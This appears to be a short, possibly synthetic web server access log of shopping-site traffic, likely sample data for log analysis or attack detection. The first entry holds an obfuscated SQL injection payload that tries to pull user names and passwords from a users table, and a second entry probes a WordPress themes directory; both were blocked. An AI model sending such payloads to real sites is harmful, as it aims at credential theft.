172.16.0.46 - - [21/May/2026:08:35:42 +0000] "GET /product?id=1/%2A%2A/UNION/%2A%2A/SELECT/%2A%2A/user%2Cpassword/%2A%2A/FROM/%2A%2A/users HTTP/1.1" 403 313 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.77 - - [21/May/2026:19:19:48 +0000] "GET /wp-content/themes/ HTTP/1.1" 403 525 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.13 - - [21/May/2026:20:11:07 +0000] "GET /products/12 HTTP/1.1" 200 1273 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.10 - - [21/May/2026:14:15:58 +0000] "GET /static/js/app.js HTTP/1.1" 200 2925 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.12 - - [21/May/2026:08:00:54 +0000] "GET /cart HTTP/1.1" 200 4804 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.11 - - [21/May/2026:13:07:48 +0000] "GET /products/12 HTTP/1.1" 200 2751 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.24 - - [21/May/2026:14:23:26 +0000] "GET /search?q=phone HTTP/1.1" 200 6161 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.12 - - [21/May/2026:11:18:13 +0000] "GET /checkout HTTP/1.1" 200 7631 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.11 - - [21/May/2026:12:40:33 +0000] "GET /products/43 HTTP/1.1" 200 6931 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
